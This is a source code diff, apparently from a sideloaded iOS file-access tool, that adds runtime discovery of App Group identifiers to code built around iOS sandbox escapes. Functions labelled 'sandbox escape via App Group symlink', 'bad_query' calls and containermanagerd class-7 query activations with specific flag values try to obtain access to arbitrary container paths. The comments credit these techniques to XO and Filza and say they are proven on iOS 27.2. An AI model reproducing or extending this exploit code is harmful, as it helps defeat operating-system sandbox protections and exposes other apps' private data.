@@ -126,12 +126,89 @@ static inline void DavizinMCMLog(NSString *msg) {
 static void _storeLease(MCMAPI *api, void *q, void *act, const char *bid, const char *path);
 static BOOL _mcmProbeCanWrite(const char *dirPath);
 
-static const char *kAppGroups[] = {
+static const char *kAppGroups_fallback[] = {
     "group.a8b3cf4e91d07562.1",
     "group.a8b3cf4e91d07562.2",
     "group.a8b3cf4e91d07562.3",
 };
-static const int kAppGroupCount = 3;
+static const int kAppGroupCount_fallback = 3;
+
+#pragma mark - Runtime app group discovery
+// Sideloading tools (SideStore, TrollStore) rewrite app-group IDs at install
+// time. Our hardcoded IDs may not match what containermanagerd knows about,
+// causing every class-7 query to fail.  Discover the real IDs at runtime.
+
+static void _getRuntimeAppGroups(const char ***outGroups, int *outCount) {
+    static const char **sGroups = NULL;
+    static int sCount = 0;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        NSArray<NSString *> *discovered = nil;
+
+        // Method 1: read entitlements from the running process
+        typedef void *(*SecTaskCreateFromSelfFunc)(CFAllocatorRef);
+        typedef CFTypeRef (*SecTaskCopyEntFunc)(void *, CFStringRef, CFErrorRef *);
+        SecTaskCreateFromSelfFunc createSelf = (SecTaskCreateFromSelfFunc)
+            dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
+        SecTaskCopyEntFunc copyEnt = (SecTaskCopyEntFunc)
+            dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
+        if (createSelf && copyEnt) {
+            void *task = createSelf(kCFAllocatorDefault);
+            if (task) {
+                CFTypeRef val = copyEnt(task,
+                    CFSTR("com.apple.security.application-groups"), NULL);
+                if (val && CFGetTypeID(val) == CFArrayGetTypeID()) {
+                    NSArray *arr = (__bridge NSArray *)val;
+                    if (arr.count > 0) discovered = [arr copy];
+                }
+                if (val) CFRelease(val);
+                CFRelease(task);
+            }
+        }
+        if (discovered.count)
+            NSLog(@"[WQ-SYM] runtime groups via SecTask: %@", discovered);
+
+        // Method 2: enumerate class-7 containers via containermanagerd
+        if (!discovered.count) {
+            MCMAPI *api = MCMGetAPI();
+            if (api->queryCreate && api->queryIterate && api->objectGetIdentifier) {
+                void *query = api->queryCreate();
+                if (query) {
+                    api->querySetClass(query, 7);
+                    api->querySetFlags(query, 0x100000000ULL);
+                    if (api->querySetPart) api->querySetPart(query, 0);
+                    NSMutableArray *arr = [NSMutableArray array];
+                    api->queryIterate(query, ^bool(void *obj) {
+                        const char *ident = obj ? api->objectGetIdentifier(obj) : NULL;
+                        if (ident) [arr addObject:[NSString stringWithUTF8String:ident]];
+                        return arr.count < 20;
+                    });
+                    api->queryFree(query);
+                    if (arr.count > 0) {
+                        discovered = [arr copy];
+                        NSLog(@"[WQ-SYM] runtime groups via MCM enum: %@", discovered);
+                    }
+                }
+            }
+        }
+
+        // Method 3: hardcoded fallback
+        if (!discovered.count) {
+            NSMutableArray *fb = [NSMutableArray arrayWithCapacity:kAppGroupCount_fallback];
+            for (int i = 0; i < kAppGroupCount_fallback; i++)
+                [fb addObject:[NSString stringWithUTF8String:kAppGroups_fallback[i]]];
+            discovered = fb;
+            NSLog(@"[WQ-SYM] WARNING: using hardcoded groups (runtime discovery failed)");
+        }
+
+        sCount = (int)discovered.count;
+        sGroups = (const char **)calloc(sCount + 1, sizeof(char *));
+        for (int i = 0; i < sCount; i++)
+            sGroups[i] = strdup(((NSString *)discovered[i]).UTF8String);
+    });
+    *outGroups = sGroups;
+    *outCount = sCount;
+}
 
 #pragma mark - worse_query symlink: sandbox escape via App Group symlink (XO/forcequitOS technique)
 
@@ -168,8 +245,10 @@ static int64_t _worseQuerySymlink(const char *targetPath) {
 
         NSFileManager *fm = [NSFileManager defaultManager];
 
-        for (int g = 0; g < kAppGroupCount; g++) {
-            NSString *groupID = [NSString stringWithUTF8String:kAppGroups[g]];
+        const char **rtGroups; int rtGroupCount;
+        _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
+        for (int g = 0; g < rtGroupCount; g++) {
+            NSString *groupID = [NSString stringWithUTF8String:rtGroups[g]];
             NSURL *containerURL = [fm containerURLForSecurityApplicationGroupIdentifier:groupID];
             if (!containerURL) {
                 NSLog(@"[WQ-SYM] no container for group %@", groupID);
@@ -221,7 +300,7 @@ static int64_t _worseQuerySymlink(const char *targetPath) {
                 }
 
                 api->querySetClass(q, 7);
-                xpc_object_t xid = xpc_string_create(kAppGroups[g]);
+                xpc_object_t xid = xpc_string_create(rtGroups[g]);
                 api->querySetGroupIdentifiers(q, xid);
                 api->querySetFlags(q, kFlagSets[fi]);
                 if (api->querySetPart) api->querySetPart(q, 3);
@@ -411,14 +490,16 @@ int64_t DavizinGrantContainerAccess(const char *containerPath) {
     // Strategy 0: MCM class-7 app group native activation (Filza technique)
     // Activating an app group sandbox extension may grant access to the target path
     MCMAPI *api = MCMGetAPI();
+    const char **rtGroups; int rtGroupCount;
+    _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
     if (api->queryCreate && api->querySetGroupIdentifiers && api->objectActivate) {
-        for (int g = 0; g < kAppGroupCount; g++) {
+        for (int g = 0; g < rtGroupCount; g++) {
             static const uint64_t kGrantFlags[] = { 0x900000000ULL, 0x8100000000ULL };
             for (int fi = 0; fi < 2; fi++) {
                 void *q = api->queryCreate();
                 if (!q) continue;
                 api->querySetClass(q, 7);
-                xpc_object_t xid = xpc_string_create(kAppGroups[g]);
+                xpc_object_t xid = xpc_string_create(rtGroups[g]);
                 api->querySetGroupIdentifiers(q, xid);
                 api->querySetFlags(q, kGrantFlags[fi]);
                 if (api->querySetPart) api->querySetPart(q, 0);
@@ -437,8 +518,7 @@ int64_t DavizinGrantContainerAccess(const char *containerPath) {
                                 close(fd);
                                 DavizinMCMLog([NSString stringWithFormat:
                                     @"Grant MCM C7[%d] f=%d activado → acceso OK para %@", g, fi, cleanPath]);
-                                // Keep query+activation alive, return sentinel handle
-                                _storeLease(api, q, act, kAppGroups[g], pathC);
+                                _storeLease(api, q, act, rtGroups[g], pathC);
                                 xpc_release(xid);
                                 return 9000 + g;
                             }
@@ -460,13 +540,13 @@ int64_t DavizinGrantContainerAccess(const char *containerPath) {
     }
 
     // Strategy 2: Class 7 (app group) via bad_query — XO Files approach for iOS 27+
-    for (int g = 0; g < kAppGroupCount; g++) {
-        handle = bad_query((char *)pathC, true, (char *)kAppGroups[g], false);
+    for (int g = 0; g < rtGroupCount; g++) {
+        handle = bad_query((char *)pathC, true, (char *)rtGroups[g], false);
         if (handle >= 0) {
             DavizinMCMLog([NSString stringWithFormat:@"Grant appGroup[%d] para %@: handle=%lld", g, cleanPath, handle]);
             return handle;
         }
-        handle = bad_query((char *)pathC, false, (char *)kAppGroups[g], false);
+        handle = bad_query((char *)pathC, false, (char *)rtGroups[g], false);
         if (handle >= 0) {
             DavizinMCMLog([NSString stringWithFormat:@"Grant appGroup[%d]-noCreate para %@: handle=%lld", g, cleanPath, handle]);
             return handle;
@@ -1044,14 +1124,16 @@ DavizinProbeResult DavizinProbeContainerWriteAccess(NSString *containerPath, NSS
 
     // ── Strategy 1.7: MCM class-7 app group query → activate → open target container ──
     if (api->queryCreate && api->querySetGroupIdentifiers) {
+        const char **rtGroups; int rtGroupCount;
+        _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
         _probeDiagAppend("S1.7:C7 | ");
-        for (int g = 0; g < kAppGroupCount; g++) {
+        for (int g = 0; g < rtGroupCount; g++) {
             static const uint64_t kC7Flags[] = { 0x900000000ULL, 0x8100000000ULL };
             for (int fi = 0; fi < 2; fi++) {
                 void *q = api->queryCreate();
                 if (!q) continue;
                 api->querySetClass(q, 7);
-                xpc_object_t xid = xpc_string_create(kAppGroups[g]);
+                xpc_object_t xid = xpc_string_create(rtGroups[g]);
                 api->querySetGroupIdentifiers(q, xid);
                 api->querySetFlags(q, kC7Flags[fi]);
                 if (api->querySetPart) api->querySetPart(q, 0);
@@ -1464,10 +1546,12 @@ static int64_t _tryGetSandboxAccess(const char *targetPath) {
     if (h >= 0) return h;
 
     // Class 7 (app group) — XO Files approach, proven on iOS 27.2
-    for (int g = 0; g < kAppGroupCount; g++) {
-        h = bad_query((char *)targetPath, true, (char *)kAppGroups[g], false);
+    const char **rtGroups; int rtGroupCount;
+    _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
+    for (int g = 0; g < rtGroupCount; g++) {
+        h = bad_query((char *)targetPath, true, (char *)rtGroups[g], false);
         if (h >= 0) return h;
-        h = bad_query((char *)targetPath, false, (char *)kAppGroups[g], false);
+        h = bad_query((char *)targetPath, false, (char *)rtGroups[g], false);
         if (h >= 0) return h;
     }
 
